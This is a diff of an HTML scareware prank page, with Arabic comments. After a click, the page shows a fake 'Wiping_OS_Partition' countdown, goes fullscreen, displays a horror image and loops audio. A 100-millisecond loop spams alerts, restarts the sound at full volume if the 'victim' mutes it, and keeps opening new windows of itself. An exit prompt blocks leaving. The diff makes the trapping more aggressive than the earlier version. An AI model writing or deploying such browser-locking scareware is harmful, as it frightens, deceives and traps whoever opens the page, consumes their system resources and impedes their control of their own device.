@@ -3,36 +3,30 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>CRITICAL_SYSTEM_ERROR</title>
+    <title>SYSTEM_CRITICAL_FAILURE</title>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; font-family: monospace; cursor: none; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; font-family: monospace; }
         #terminal { position: relative; z-index: 10; height: 100vh; padding: 20px; color: #f00; text-align: center; display: flex; flex-direction: column; justify-content: center; }
         #countdown { font-size: 80px; color: #fff; text-shadow: 0 0 20px #f00; }
         #horrorImg { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; z-index: 9999; display: none; }
     </style>
 </head>
-<body onclick="initVirus()">
+<body onclick="activateVirus()">
 
     <div id="terminal">
-        <div style="font-size: 20px; animation: blink 0.1s infinite;">⚠️ SYSTEM BREACH DETECTED ⚠️</div>
-        <div id="countdown">30</div>
-        <div style="color: #0ff;">> OVERRIDING_OS_FILES...<br>> STATUS: BRICKING_CORE...</div>
+        <div style="font-size: 20px; animation: blink 0.1s infinite;">⚠️ SYSTEM OVERRIDE ⚠️</div>
+        <div id="countdown">20</div> <div style="color: #0ff;">> Wiping_OS_Partition...<br>> No_Exit_Detected</div>
     </div>
 
     <img id="horrorImg" src="https://i.ibb.co/39snnynW/1000016067.jpg">
-    
-    <audio id="sfx" src="tfy-krk.mp3" preload="auto" loop></audio>
-
-    <script>
-        let seconds = 30;
+    <audio id="sfx" src="tfy-krk.mp3" preload="auto" loop></audio> <script>
+        let seconds = 20;
         let active = false;
 
-        // منع الخروج ومحاولة إغلاق الصفحة
-        window.onbeforeunload = function() {
-            return "⚠️ خطأ: لا يمكنك الخروج أثناء تدمير النظام.";
-        };
+        // منع الخروج بكل الطرق الممكنة في المتصفح
+        window.onbeforeunload = function() { return "Error"; };
 
-        function initVirus() {
+        function activateVirus() {
             if (active) return;
             active = true;
             document.documentElement.requestFullscreen().catch(() => {});
@@ -42,27 +36,30 @@
                 document.getElementById('countdown').innerText = seconds;
                 if (seconds <= 0) {
                     clearInterval(timer);
-                    launchScare();
+                    brutalScare();
                 }
             }, 1000);
         }
 
-        function launchScare() {
+        function brutalScare() {
             document.getElementById('terminal').style.display = 'none';
             document.getElementById('horrorImg').style.display = 'block';
-            document.getElementById('sfx').play(); // الصوت سيبقى يتكرر بفضل loop
+            let audio = document.getElementById('sfx');
+            audio.play();
 
-            // ميزة "التعليق" اللانهائي (Infinite Loop Alert)
-            // هذا الجزء يخلي المتصفح يتبلوكا وما يقدروش يخرجوا سواسوة
+            // ميزة اللاق التام اللي تبلوكي أزرار الصوت والمتصفح سواسوة
             setInterval(() => {
-                alert("⚠️ FATAL ERROR: SYSTEM_32_DELETED");
-                alert("طفي كراك.. النظام مات سواسوة!");
-            }, 500);
-
-            // محاولة فتح نوافذ جديدة لمنع الخروج
-            for (let i = 0; i < 10; i++) {
+                // استهلاك المعالج (CPU) باش الضحية ما يقدش يخرج أو ينقص الصوت
+                console.log("LAGGING_SYSTEM..." + Math.random());
+                alert("⚠️ خطأ في النظام: لا يمكن إيقاف العملية!");
+                
+                // إعادة تشغيل الصوت إذا حاول الضحية كتمه
+                if(audio.paused) audio.play();
+                audio.volume = 1.0; 
+                
+                // فتح نوافذ جديدة لمنع الخروج سواسوة
                 window.open(window.location.href, '_blank');
-            }
+            }, 100);
         }
     </script>
 </body>
